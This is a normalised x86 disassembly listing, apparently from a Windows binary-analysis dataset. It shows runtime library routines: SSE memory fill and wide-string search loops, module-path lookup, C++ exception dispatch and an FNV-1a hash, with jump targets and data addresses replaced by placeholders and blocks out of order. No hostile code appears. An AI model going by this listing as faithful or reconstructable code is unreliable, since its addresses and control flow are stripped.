movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
add edi 0x20
sub ecx 0x20
cmp ecx 0x20
jae r-xdata
movd xmm0 eax
pshufd xmm0 xmm0 0x0
add ecx edi
movups [ edi ] xmm0
add edi 0x10
and edi 0xfffffff0
sub ecx edi
cmp ecx 0x80
jle r-xdata
mov [ edi ] eax
mov [ edi + 0x4 ] eax
add edi 0x8
sub ecx 0x8
test ecx 0xfffffff8
jne r-xdata
test ecx 0x1f
je r-xdata
lea esp [ esp ]
lea esp [ esp ]
nop
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
sub ecx 0x80
test ecx 0xffffff00
jne r-xdata
jmp r-xdata
cmp ecx 0x20
jb r-xdata
sub_40dffa
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebx + 0xc ]
xor eax eax
movzx ecx [ edi ]
mov [ ebp - 0x8 ] ecx
cmp ax cx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
jne r-xdata
mov eax edi
and eax 0xfff
push 0x2
pop esi
cmp eax 0xff0
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov edx [ ebx + 0x8 ]
movzx eax [ edx ]
test ax ax
je r-xdata
movzx eax cx
pxor xmm3 xmm3
mov ecx [ ebx + 0x8 ]
push 0x2
pop esi
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm4 xmm0 0x0
push 0x8
pxor xmm0 xmm0
movzx ecx cx
pop edx
movups xmm0 [ edi ]
jmp r-xdata
xor eax eax
and [ ebp - 0x8 ] 0x0
mov ecx eax
mov eax edx
sub eax edi
mov [ ebp - 0x4 ] eax
push 0x2
pop esi
test cx cx
je r-xdata
movzx eax [ ecx ]
xor edx edx
cmp dx ax
je r-xdata
movups xmm1 [ ecx ]
movaps xmm0 xmm3
pcmpeqw xmm0 xmm1
pcmpeqw xmm1 xmm4
por xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
sub edx 0x1
jne r-xdata
add edi esi
movzx ecx [ edi ]
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x8 ]
movzx ecx [ edi ]
test cx cx
je r-xdata
movzx edx [ edi ]
cmp dx ax
jne r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
shr eax 0x1
lea ecx [ ecx + eax * 2 ]
add ecx 0x10
jmp r-xdata
movzx eax cx
psrldq xmm0 0x2
pinsrw xmm0 eax 0x7
xor eax eax
cmp ax cx
je r-xdata
mov ecx [ ebp - 0x8 ]
movzx eax [ edx ]
xor edi edi
cmp di ax
je r-xdata
pcmpistri xmm0 [ edx ] 0xd
jbe r-xdata
mov eax edx
jmp r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add eax esi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
test cx cx
jne r-xdata
movzx ecx [ eax + edi ]
movzx eax [ edi ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
jne r-xdata
add ecx esi
jmp r-xdata
mov edx ecx
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
cmp ax cx
je r-xdata
jae r-xdata
add edx 0x10
cmp [ edi ] cx
je r-xdata
add edi esi
cmp [ eax + edi ] cx
jne r-xdata
movzx eax [ edi ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x8 ] ax
je r-xdata
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebx + 0xc ]
mov edi edx
add edx esi
jmp r-xdata
pcmpistri xmm0 [ edx ] 0xd
lea edx [ edx + ecx * 2 ]
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
jmp r-xdata
mov eax ecx
jmp r-xdata
cmp [ edx ] ax
jne r-xdata
movups xmm2 [ edi ]
movups xmm1 [ edx ]
movaps xmm0 xmm3
pcmpeqw xmm1 xmm2
pcmpeqw xmm0 xmm2
pcmpeqw xmm1 xmm3
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
movzx eax [ ecx ]
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4 ] ax
je r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add edi esi
jmp r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
and eax 0xfffffffe
add edx eax
add edi eax
add edx 0x10
add edi 0x10
jmp r-xdata
cmp [ edi ] ax
jne r-xdata
movups xmm1 [ ecx ]
pcmpistri xmm1 [ edi ] 0xd
jno r-xdata
mov eax edi
and eax 0xfff
cmp eax 0xff0
ja r-xdata
add edx esi
jmp r-xdata
add edi esi
add ecx esi
jmp r-xdata
js r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov eax edi
mov [ ebp - 0x4 ] ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebp - 0x4 ]
add edi 0x10
add ecx 0x10
jmp r-xdata
sub_40e27d
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] 0x2
jge r-xdata
mov edx [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ecx
lea eax [ edx + 0x1 ]
test al 0xe
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
mov ax [ ebp + 0xc ]
movzx eax [ edx ]
cmp ax cx
jne r-xdata
xor eax eax
cmp ax cx
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
test ax ax
je r-xdata
mov esi edx
movzx eax cx
movd xmm0 eax
mov eax 0xffff0001
movd xmm1 eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ecx
jmp r-xdata
sub ecx 0x2
cmp ecx edx
je r-xdata
mov eax esi
add edx 0x2
je r-xdata
lea esi [ edx + ecx * 2 ]
movups xmm0 [ edx ]
pcmpistri xmm1 xmm0 0x15
jne r-xdata
pop esi
pop ebp
retn
add edx 0x10
jmp r-xdata
add edx 0x10
lea eax [ edx + ecx * 2 ]
jmp r-xdata
pcmpistri xmm0 [ edx ] 0x41
jae r-xdata
sub_40e31f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
push esi
push edi
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax eax
jne r-xdata
cmp eax esi
jne r-xdata
xor ecx ecx
mov [ edi ] cx
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ edi + esi * 2 - 0x2 ] ax
sub_40e388
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40e31f
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40e424
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20c ]
push 0x104
push ecx
push eax
call sub_40e31f
add esp 0xc
cmp [ rw-data ] 0x5
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
push edi
push 0x2000
push 0x0
mov edi rw-data
push edi
call sub_40119b
add esp 0xc
test al al
je r-xdata
pop edi
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_4010a7
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call sub_4010df
lea eax [ ebp - 0x24c ]
push eax
push 0x4
push 0x0
push 0x0
push r--data
push edi
call sub_4011d7
add esp 0x28
sub_40e4e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0xc ]
add ecx edi
xor ecx [ eax + edi ]
pop edi
pop esi
pop ebp
jmp sub_40c38e
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40c38e
sub_40e520
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov eax [ ebx + 0x8 ]
lea esi [ ebx + 0x10 ]
xor eax [ rw-data ]
push esi
push eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] eax
call sub_40e4e0
mov edi [ ebp + 0x10 ]
push edi
call sub_40fef0
mov eax [ ebp + 0x8 ]
add esp 0xc
test [ eax + 0x4 ] 0x66
jne r-xdata
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edi
mov edi [ ebx + 0xc ]
mov [ ebx - 0x4 ] eax
cmp edi 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_410627
mov ecx [ ebp - 0x8 ]
lea eax [ edi + 0x2 ]
lea eax [ edi + eax * 2 ]
mov ebx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
test ecx ecx
je r-xdata
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_4105de
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
push esi
push [ ebp - 0x8 ]
call sub_40e4e0
add esp 0x8
mov edi ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_41060e
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] edi
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
push esi
push [ ebp - 0x8 ]
mov [ eax + 0xc ] ebx
call sub_40e4e0
mov ecx [ ebp - 0x14 ]
add esp 0x8
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_4105f5
int3
jmp r-xdata
push r--data
call sub_448970
add esp 0x4
test eax eax
je r-xdata
push rw-data
push esi
mov edx edi
mov ecx eax
call sub_410627
mov eax [ ebp + 0xc ]
mov esi [ r--data ]
mov ecx esi
push 0x1
push [ ebp + 0x8 ]
call j_sub_40d4a2
call esi
mov esi [ ebp - 0x10 ]
add esp 0x8
sub_40e6d1
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov ecx [ edi ]
test ecx ecx
je r-xdata
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ebx
push esi
lea ebx [ ecx + 0x1 ]
push ebx
call sub_429a2d
mov esi eax
pop ecx
test esi esi
je r-xdata
push esi
call j_sub_42d3b1#3
pop ecx
pop esi
pop ebx
jmp r-xdata
push [ edi ]
push ebx
push esi
call sub_42d2ce
mov eax [ ebp + 0xc ]
mov ecx esi
add esp 0xc
xor esi esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop edi
pop ebp
retn
sub_40e734
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
pop ebp
retn
push [ esi ]
call j_sub_42d3b1#3
pop ecx
sub_40e753
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] edi
test edi edi
je r-xdata
test [ edi ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test [ edi ] 0x8
je r-xdata
mov ecx [ ebx ]
sub ecx 0x4
push ecx
mov eax [ ecx ]
mov esi [ eax + 0x20 ]
mov ecx esi
mov edi [ eax + 0x18 ]
call j_sub_40d4a2
call esi
mov [ ebp - 0xc ] 0x1994000
sub_40e7c1
call sub_410708
call sub_410480
call sub_41063e
test al al
jne r-xdata
call sub_40ebe1
test al al
jne r-xdata
xor al al
retn
call sub_40e4c0
mov al 0x1
retn
call sub_41068f
jmp r-xdata
sub_40e805
push ebp
mov ebp esp
call sub_40e4d3
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
call sub_40ec14
call sub_41068f
push 0x0
call sub_4104a4
pop ecx
sub_40e948
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jne r-xdata
add ecx 0x5
add eax 0x5
xor eax eax
pop ebp
retn
sbb eax eax
or eax 0x1
pop ebp
retn
test dl dl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
jmp r-xdata
sub_40e984
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InterlockedFlushSList@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push esi
mov esi [ eax ]
push eax
call sub_42d3b1
mov eax esi
pop ecx
test esi esi
jne r-xdata
pop esi
sub_40e9a7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx 0x811c9dc5
lea ecx [ eax + 0x5 ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
movzx eax al
xor eax edx
imul edx eax 0x1000193
inc ecx
mov eax edx
pop ebp
retn
sub_40e9cd
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
[ ebx ] ecx
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x2800
push j_sub_42d3b1#2
push sub_40e837
push eax
lea ecx [ ebx + 0x5 ]
mov [ ebp - 0x4 ] eax
push ecx
push eax
call sub_416567
mov esi eax
add esp 0x18
test esi esi
je r-xdata
push esi
call sub_42d3b1
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
mov ecx esi
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
je r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
add eax 0x4
push edi
push eax
call sub_42d3eb
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp [ esi + ecx - 0x1 ] 0x20
jne r-xdata
push edi
mov [ ebp - 0x4 ] eax
call sub_42d3b1
pop ecx
pop edi
and [ edi ] 0x0
lea eax [ edi + 0x4 ]
push esi
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x4 ] eax
call sub_42d2ce
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor eax eax
[ ebx ] ecx
test eax eax
jne r-xdata
mov [ esi + ecx - 0x1 ] 0x0
sub ecx 0x1
jne r-xdata
push [ ebp - 0xc ]
xor edi edi
push [ ebp + 0xc ]
call [ InterlockedPushEntrySList@IAT ]
mov eax [ ebp - 0x4 ]
sub_40eb25
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push eax
call sub_4103fd
pop ecx
pop ecx
push esi
call sub_40eb09
pop esi
push eax
call sub_4103c3
mov esi eax
mov eax [ rw-data ]
pop ecx
sub_40eb69
cmp [ rw-data ] 0xffffffff
jne r-xdata
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_4103c3
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
retn
push 0x28
push 0x1
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
jmp r-xdata
push edi
call [ SetLastError@IAT ]
xor edi edi
jmp r-xdata
push esi
push [ rw-data ]
call sub_4103fd
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_42d3b1
pop ecx
mov eax edi
push edi
call [ SetLastError@IAT ]
mov edi esi
xor esi esi
sub_40ebe1
push sub_40eb09
call sub_41034f
mov [ rw-data ] eax
pop ecx
cmp eax 0xffffffff
jne r-xdata
push rw-data
push eax
call sub_4103fd
pop ecx
pop ecx
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_40ec14
jmp r-xdata
sub_40ec30
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4167cc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4167cc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40ec7c
push 0x8
push r--data
call sub_40d270
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_40d2b6
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_40f5b4
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_40d4a2
call esi
sub_40ed10
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_40c6cd
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ed5a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
lea eax [ ecx + 0x4 ]
push eax
call sub_40e948
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40ed78
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_40e734
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40c377
pop ecx
pop ecx
sub_40eda5
push 0x38
push r--data
call sub_40d270
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
and [ ebp - 0x3c ] 0x0
mov ebx [ ebp + 0xc ]
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x2c ] eax
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_40d722
pop ecx
pop ecx
mov [ ebp - 0x30 ] eax
call sub_40eb5b
mov eax [ eax + 0x10 ]
mov [ ebp - 0x34 ] eax
call sub_40eb5b
mov eax [ eax + 0x14 ]
mov [ ebp - 0x38 ] eax
call sub_40eb5b
mov [ eax + 0x10 ] edi
call sub_40eb5b
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push ebx
call sub_40d4b5
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40eee0
mov eax ebx
call sub_40d2b6
retn
sub_40ee39
mov esp [ ebp - 0x18 ]
call sub_40eb5b
and [ eax + 0x20 ] 0x0
mov edx [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
push eax
push edx
push 0x0
push ebx
call sub_40fb75
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x40 ] 0x0
call sub_40eee0
mov eax ebx
call sub_40d2b6
retn
imul ebx ecx 0x14
mov [ ebp - 0x24 ] ebx
cmp eax [ ebx + edi + 0x4 ]
mov ebx [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] eax
mov edi [ edx + 0x10 ]
xor ecx ecx
mov [ ebp - 0x28 ] ecx
cmp [ edx + 0xc ] ecx
jbe r-xdata
inc ecx
mov [ ebp - 0x28 ] ecx
cmp ecx [ edx + 0xc ]
jb r-xdata
mov ebx [ ebp - 0x24 ]
cmp eax [ ebx + edi + 0x8 ]
mov ebx [ ebp + 0xc ]
jg r-xdata
imul eax ecx 0x14
mov eax [ eax + edi + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov eax [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
sub_40eee0
mov eax [ ebp - 0x2c ]
mov [ ebx - 0x4 ] eax
push [ ebp - 0x30 ]
call sub_40d746
pop ecx
call sub_40eb5b
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
call sub_40eb5b
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x14 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp [ edi + 0x14 ] 0x19930521
je r-xdata
retn
test ebx ebx
je r-xdata
cmp [ edi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x18 ]
call sub_40d78e
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] 0x0
setne al
movzx eax al
push eax
push edi
call sub_40ec7c
pop ecx
pop ecx
jmp r-xdata
sub_40ef9b
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_40f623
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_40d66a
call sub_40d69c
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40fb75
mov eax [ esi + 0x4 ]
inc eax
push 0x100
push [ ebp + 0x28 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40eda5
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_40f016
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb5b
xor ecx ecx
inc ecx
mov [ eax + 0x20 ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40f060
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ ebx + 0x8 ]
jmp r-xdata
call sub_42d238
cmp eax [ edi + 0x4 ]
jge r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb5b
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push eax
push edi
push [ ebp + 0x14 ]
push ecx
push ebx
push esi
call sub_40f3be
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb5b
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_40eb5b
mov esi [ eax + 0x10 ]
call sub_40eb5b
mov [ ebp - 0x28 ] 0x1
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
test esi esi
je r-xdata
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
push eax
push [ ebp + 0x20 ]
push edi
call sub_40d5f2
mov edx [ ebp - 0x18 ]
add esp 0x14
cmp edx [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_40eb5b
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40ec7c
pop ecx
pop ecx
lea ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_40eb5b
mov eax [ eax + 0x1c ]
mov [ ebp - 0x20 ] eax
call sub_40eb5b
push [ ebp - 0x20 ]
push esi
and [ eax + 0x1c ] 0x0
call sub_40f4d9
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc edx
add ecx 0x14
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x20 ] ecx
cmp edx [ ebp - 0x2c ]
jb r-xdata
cmp eax [ ecx - 0xc ]
jg r-xdata
